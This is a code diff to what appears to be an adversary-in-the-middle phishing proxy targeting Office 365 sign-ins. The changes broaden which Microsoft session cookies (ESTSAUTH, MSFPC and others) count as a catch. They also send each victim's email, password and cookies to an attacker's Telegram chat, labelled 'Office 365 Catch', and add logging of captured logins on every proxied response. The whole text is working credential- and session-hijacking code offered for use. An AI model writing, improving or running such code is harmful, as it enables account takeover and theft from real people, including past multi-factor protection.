@@ -26,6 +26,7 @@ def send_telegram(message):
             json={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"},
             timeout=10,
         )
+        print(f"[TG SENT] to {TELEGRAM_CHAT_ID}")
     except Exception as e:
         print(f"[TG ERROR] {e}")
 
@@ -33,22 +34,33 @@ def send_telegram(message):
 # --- Cookie capture after login ---
 def check_and_send(vid):
     info = CAPTURED.get(vid)
-    if not info or info.get("sent"):
+    if not info:
         return
+    if info.get("sent"):
+        return
+    
     sess = visitor_sessions.get(vid)
     if not sess:
         return
+
+    # Check for any significant Microsoft auth cookies
     cookies = sess.cookies.get_dict()
-    if "ESTSAUTHPERSISTENT" in cookies or "ESTSAUTH" in cookies:
+    auth_cookies = [k for k in cookies.keys() if k.startswith(("ESTSAUTH", "MSFPC", "MSPRequ", "ANON"))]
+    
+    # If we have password AND at least one auth cookie, send it
+    if info.get("password") and auth_cookies:
         info["sent"] = True
         cookie_str = "\n".join(f"<code>{k}={v}</code>" for k, v in cookies.items())
         msg = (
             f"<b>✅ Office 365 Catch</b>\n\n"
             f"<b>Email:</b> <code>{info.get('email', '?')}</code>\n"
             f"<b>Password:</b> <code>{info.get('password', '?')}</code>\n\n"
-            f"<b>Cookies:</b>\n{cookie_str}"
+            f"<b>Cookies ({len(auth_cookies)} auth cookies):</b>\n{cookie_str}"
         )
         send_telegram(msg)
+    elif info.get("password"):
+        # Debug: if we have password but no cookies yet, print to logs
+        print(f"[DEBUG] Vid {vid} has password but no auth cookies yet. Cookies: {list(cookies.keys())}")
 
 
 # --- Multi-value Set-Cookie extraction (works on urllib3 v1 and v2) ---
@@ -170,6 +182,7 @@ def proxy(path):
                 "password": passwd,
                 "sent": prev.get("sent", False),
             }
+            print(f"[CAPTURED] Vid {vid}: {login}")
 
     # --- Build response ---
     r = Response(status=resp.status_code)
@@ -218,6 +231,7 @@ def proxy(path):
     if new_vid:
         r.set_cookie("vid", vid, max_age=86400, path="/", samesite="Lax")
 
+    # Check for cookies/credentials on EVERY response
     check_and_send(vid)
     return r
 
